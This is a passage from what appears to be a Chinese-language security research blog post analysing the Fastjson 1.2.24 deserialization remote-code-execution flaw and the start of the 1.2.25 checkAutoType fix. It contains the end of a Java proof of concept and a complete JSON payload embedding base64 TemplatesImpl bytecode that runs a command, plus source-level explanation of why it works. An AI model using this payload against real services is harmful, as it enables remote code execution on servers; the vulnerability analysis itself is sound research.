            //此处删除了一些我觉得没有用的参数（第二个_name，_version，allowedProtocols），并没有发现有什么影响
            System.out.println(text1);
            //服务端触发payload
            ParserConfig config = new ParserConfig();
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        }
        //main函数调用以下poc而已
        public static void main(String args[]){
            try {
                poc();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
可以看到payload使用`被屏蔽的type`反序列化了`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`这个类。
最终payload输出如下:
    {"被屏蔽的type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADMAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARsYWxhAQAMSW5uZXJDbGFzc2VzAQAcTOeJiOacrDI0L2pkazd1MjFfbWluZSRsYWxhOwEAClNvdXJjZUZpbGUBABFqZGs3dTIxX21pbmUuamF2YQwABAAFBwATAQAa54mI5pysMjQvamRrN3UyMV9taW5lJGxhbGEBABBqYXZhL2xhbmcvT2JqZWN0AQAV54mI5pysMjQvamRrN3UyMV9taW5lAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAFQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABcAGAoAFgAZAQAEY2FsYwgAGwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMAB0AHgoAFgAfAQARTGFMYTg4MTIwNDQ1NzYzMDABABNMTGFMYTg4MTIwNDQ1NzYzMDA7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAADwAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ"],'_name':'a.b','_tfactory':{ },'_outputProperties':{ }}
7u21 那篇文中总结得到恶意TemplatesImple类需要满足如下条件。
  1. TemplatesImpl类的 `_name` 变量 != null
  2. TemplatesImpl类的`_class`变量 == null
  3. TemplatesImpl类的 `_bytecodes` 变量 != null
  4. TemplatesImpl类的`_bytecodes`是我们代码执行的类的字节码。`_bytecodes`中的类必须是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`的子类
  5. 我们需要执行的恶意代码写在`_bytecodes` 变量对应的类的静态方法或构造方法中。
  6. TemplatesImpl类的`_tfactory`需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类
显而易见1-3，5均符合（_class没有赋值即为null）。
然后我们调用满足条件的恶意TemplatesImple类的getOutputProperties方法，完成RCE。这是fastjson将自动调用字段的getter方法导致的，我们看一下getOutputProperties方法是否满足自动调用getter方法的条件：
`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties`
    public synchronized Properties getOutputProperties() {
            try {
                return newTransformer().getOutputProperties();
            }
            catch (TransformerConfigurationException e) {
                return null;
            }
        }
  * [x] 方法名长度大于等于4 
  * [x] 非静态方法
  * [x] 以get开头且第4个字母为大写
  * [x] 无传入参数
  * [x] 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong（上面举例的时候说过Properties继承自Hashtables，实现了Map，所以符合）
那么存在以下三个问题
  1. 为什么`_tfactory`可以是一个空的对象，而不是一个拥有getExternalExtensionsMap的类？
  2. _bytecodes为什么不再是字节码，而是需要base64编码？
  3. 我们要调用TemplatesImple类的getOutputProperties方法，但是为什么是`_outputProperties`字段，多了一个`_`？
### _tfactory为空的说明
在fastjson组件对于以上这一串东西进行解析时，会先解析出被屏蔽的type来还原出TemplatesImpl类。然后再根据之后的字段将TemplatesImpl类的属性赋值，至于赋值的内容会重新进行一次解析。
在看对于赋值内容的解析步骤时，会发现当赋值的值为一个空的Object对象时，会新建一个需要赋值的字段应有的格式的新对象实例。
`/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:627`
`/com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java:62`
那么_tfactory的应有的格式是哪来的呢，从定义来。
`/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java`
    /**
         * A reference to the transformer factory that this templates
         * object belongs to.
         */
        private transient TransformerFactoryImpl _tfactory = null;
所以之所以_tfactory的json字符串的值为空是OK的。
### _bytecodes需要base64编码
跟踪`_bytecodes`字段的值处理，同样还是刚才的地方，但是由于`_bytecodes`的值不是对象，进入另一个赋值方式。
`/com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java:71`
`com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze`
    //进去后判断字段类型，当前是class[B byte数组，上面啥都不做，进行解析
            ...
            }
            JSONArray array = new JSONArray();
            parser.parseArray(componentClass, array, fieldName);//进入此处
            return (T) toObjectArray(parser, componentClass, array);
        }
`com.alibaba.fastjson.parser.DefaultJSONParser#parseArray(java.lang.reflect.Type,
java.util.Collection, java.lang.Object)`
    //type=class [B byte数组
    //fieldName = _bytecodes
    public void parseArray(Type type, Collection array, Object fieldName) {
    ...//这边就是在根据type类型进行不同的处理
    } else {//byte数组进入此处
                            val = deserializer.deserialze(this, type, i);//在这句进行解析
                        }
                        array.add(val);
                        checkListResolve(array);
                    }
                    if (lexer.token() == JSONToken.COMMA) {
                        lexer.nextToken(deserializer.getFastMatchToken());
                        continue;
                    }
                }
            } finally {
                this.setContext(context);
            }
`com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze`
    public  T deserialze(DefaultJSONParser parser, Type type, Object fieldName) {
            final JSONLexer lexer = parser.lexer;
            if (lexer.token() == JSONToken.NULL) {
                lexer.nextToken(JSONToken.COMMA);
                return null;
            }
            //我们输入的json串中， _bytecodes 字段对应的值是String类型字符串，进入此处
            if (lexer.token() == JSONToken.LITERAL_STRING) {
                byte[] bytes = lexer.bytesValue();//进入此处，获取json串的值恢复到byte数组
                lexer.nextToken(JSONToken.COMMA);
                return (T) bytes;
            }
com.alibaba.fastjson.parser.JSONScanner#bytesValue
    public byte[] bytesValue() {
            return IOUtils.decodeBase64(text, np + 1, sp);//base64解码
        }
可见在代码逻辑中，字段的值从String恢复成`byte[]`，会经过一次base64解码。这是应该是fastjson在传输`byte[]`中做的一个内部规定。序列化时应该也会对byte[]自动base64编码。
try一下，果然如此。
### _getOutputProperties字段 => getOutputProperties方法
简单的删掉`_`试一下：
可以发现，并不会对结果造成什么影响，可见这个_不是必须的。
那么是在哪里对这个_进行了处理呢？
在字段解析之前，会对于当前字段进行一次智能匹配`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField`:
    public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType,
                                  Map fieldValues) {
            JSONLexer lexer = parser.lexer; 
            FieldDeserializer fieldDeserializer = smartMatch(key);//进入此处，根据json串的字段名来获取字段反序列化解析器。
        ...
`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch`
    public FieldDeserializer smartMatch(String key) {
            if (key == null) {
                return null;
            }
            FieldDeserializer fieldDeserializer = getFieldDeserializer(key);
            if (fieldDeserializer == null) {
                boolean startsWithIs = key.startsWith("is");
                ...
                    //以下省略了对于is开头的字段的一些判断逻辑。
                    //好像满足了一定条件，会去跟对应的符合getter，settger的方法名匹配。
                    //好像又回到is方法可以调用不了，但是真的脑壳疼，漏洞关键也不在于此，就不纠结了。
                }
            }
            //遍历我们输入的key的每一个字符，匹配第一个-或_替换为空
            if (fieldDeserializer == null) {
                boolean snakeOrkebab = false;
                String key2 = null;
                for (int i = 0; i 
`getOutputProperties`方法具体演变的细节。那么以上分析结果也让我们知道加个骚气的小杠`-`应该也是可以的。
至此就完成了在知道Templates触发类原理的情况下，变形衍生到了fastjson中完成RCE。
> 至于Templates恶意类的第二个触发点，xalan
> 2.7.2的`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，在JDK反序列化Gadgets7u21一文中有补充说明，这里就不多说了。
## Fastjson抗争的一生
在讲述完最开始引发漏洞的1.2.24版本之后，其实接下来的部分才是开起此篇的初衷。但是因为基础实在是差+懒，直到现在才开始正文。
### 1.2.24漏洞版本修复
在1.2.25版本，针对1.2.24版本进行了修复。
我们可以总结以下1.2.24版本的漏洞产生原因：
  1. `被屏蔽的type`该关键词的特性会加载任意类，并给提供的输入字段的值进行恢复，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。  
这个过程会被叫做fastjson的反序列化过程，注意不要把这个过程跟java反序列化过程混为一谈。它们两个是同等级的存在，而不是前者基于后者之上。也就是说readObject()反序列化利用点那一套在这根本不适用。相应的被屏蔽的type加载任意类+符合条件的setter与getter变成了反序列化利用点（个人总结的三要素中的反序列化漏洞触发点）。
  2. 在找到可以调用的setter、getter之后，从这个可以被出发的setter、getter之后就可以沿着不同的反序列化利用链前进，比如具有一定限制条件的TemplatesImpl利用链，JNDI注入的利用链。（个人总结三要素中的反序列化利用链）
  3. 沿着链就会到最后的payload触发点。比如JNDI的远程恶意class文件的实例化操作（构造函数，静态方法）或调用类中getObjectInstance方法，与TemplatesImpl利用链中的class文件字节码的的实例化操作（构造函数，静态方法）（个人总结三要素中的反序列化payload触发点）
> 可以注意到最终的payload触发点具有好像是巧合的统一性，都类似于是一个class文件的实例化操作。在commons-> collections中则是反射机制（这在被屏蔽的type中的getter、setter函数调用中也被用到）。我们应该对这两个点产生敏感性。
修复则是针对三要素中的一者进行截断。在1.2.25中的修复原理就是针对了反序列化漏洞触发点进行限制。对于`被屏蔽的type`标签进行一个白名单+黑名单的限制机制。
使用万能的idea对两个版本的jar包进行对比
可以注意到，在解析json串的`DefaultJSONParser类`中做了一行代码的修改。当输入的键值是`被屏蔽的type`时，原本直接对值对应的类进行加载。现在会将值ref传入`checkAutoType方法`中。
checkAutoType是1.2.25版本中新增的一个白名单+黑名单机制。同时引入一个配置参数`AutoTypeSupport`。参考[官方wiki](https://github.com/alibaba/fastjson/wiki/enable_autotype)
Fastjson默认AutoTypeSupport为False（开启白名单机制），通过需要服务端通过以下代码来显性修改。
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true); （关闭白名单机制）
由于checkAutoType中两条路线的代码是穿插的，我们先来看默认`AutoTypeSupport为False`时的代码。
`1.2.25版本com.alibaba.fastjson.parser.ParserConfig#checkAutoType(开启白名单机制)`
    public Class checkAutoType(String typeName, Class expectClass) {
            if (typeName == null) {
                return null;
            }
            final String className = typeName.replace('$', '.');
            //一些固定类型的判断，此处不会对clazz进行赋值，此处省略
            if (!autoTypeSupport) {
                //进行黑名单匹配，匹配中，直接报错退出
                for (int i = 0; i < denyList.length; ++i) {